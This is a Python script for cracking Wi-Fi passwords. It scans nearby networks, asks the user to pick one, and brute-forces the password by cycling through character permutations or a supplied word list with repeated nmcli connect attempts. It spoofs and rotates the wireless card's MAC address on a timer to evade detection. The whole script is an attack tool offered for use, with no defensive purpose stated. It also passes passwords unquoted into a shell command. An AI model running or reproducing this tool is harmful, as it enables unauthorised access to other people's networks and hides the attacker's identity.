import random
from itertools import *
import os
import subprocess
from threading import Timer

yes = 'no'
net = None
while yes != 'y':
    scan = str(subprocess.check_output('nmcli device wifi', shell=True)).split('\\n')
    ine = ''
    m = 0
    block = []
    for sc in scan:
        if sc.split().__len__() > 1 and sc.split()[1] not in block:
            if m == 0:
                m = 1
                ine += f'{sc.split()[2]}:\n'
            elif sc.split().__len__() > 1 and sc.split()[1] != '--' and '*' not in sc.split():
                ine += f'{m}.{sc.split()[1]}\n'
                block.append(sc.split()[1])
                m += 1
    print(ine)
    net = int(input('Network SSID: '))
    net = block[net - 1]
    yes = input(f'You want hack {net}! Lets do it? [y/n] ')
os.system('sudo ip link set wlp2s0 up')

batcmd = "iw wlp2s0 link"
result = subprocess.check_output(batcmd, shell=True)
y = input('Do you know passwords words?')
sim = []
if y == 'yes':
    print('if you want to stop it press enter')
    word = 'bla bla'
    while word != '':
        word = input()
        if len(word) - 1 >= 0 and word[0] == '!':
            word1 = ''
            for w in list(word):
                if w == '!':
                    pass
                else:
                    word1 += w
            l = word1.split('-')
            for i in range(int(l[0]), int(l[1]) + 1):
                sim.append(str(i))
        else:
            if word != '':
                sim.append(word)

else:
    sim = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's',
           'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I',
           'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', 'Й', 'Ц', 'У', 'К',
           'Е', 'Н', 'Г', 'Ш', 'Щ', 'З', 'Х', 'Ъ', 'Ф', 'Ы', 'В', 'А', 'П', 'Р', 'О', 'Л', 'Д', 'Ж', 'Э', 'Я', 'Ч', 'С',
           'М', 'И', 'Т', 'Ь', 'Б', 'Ю', 'Ё', 'ё', 'й', 'ц', 'у', 'к', 'е', 'н', 'г', 'ш', 'щ', 'з', 'х', 'ъ', 'ф', 'ы',
           'в', 'а', 'п', 'р', 'о', 'л', 'д', 'ж', 'э', 'я', 'ч', 'с', 'м', 'и', 'т', 'ь', 'б', 'ю', ',', '.', '/', '[',
           ']', '-', '=', '*', '%', '$', '#', '@', '!']


def get_mac():
    mac1 = [0x00, 0x16, 0x3e,
            random.randint(0x00, 0x7f),
            random.randint(0x00, 0xff),
            random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac1))


def change():
    mac = get_mac()
    subprocess.call(['ifconfig', 'wlp2s0', 'down'])
    subprocess.call(['ifconfig', 'wlp2s0', 'hw', 'ether', mac])
    subprocess.call(['ifconfig', 'wlp2s0', 'up'])


min_e = int(input('from: '))
max_e = int(input('to: '))
password = ''
for L in range(min_e, max_e):
    for subset in permutations(sim, L):
        password = ''
        for a in subset:
            password += a
        if len(password) >= 8:
            print(f'testing: {password}')
            t = Timer(6, change)
            t.start()
            os.system(f'nmcli dev wifi connect "{net}" password {password}')
            if t.is_alive():
                t.cancel()
            result = subprocess.check_output(batcmd, shell=True)
            if net in str(result):
                print('============================')
                print(f'Password from wifi named: "{net}" was: {password}')
                print('============================')
                os.abort()
print('Sorry it isn`t work!')

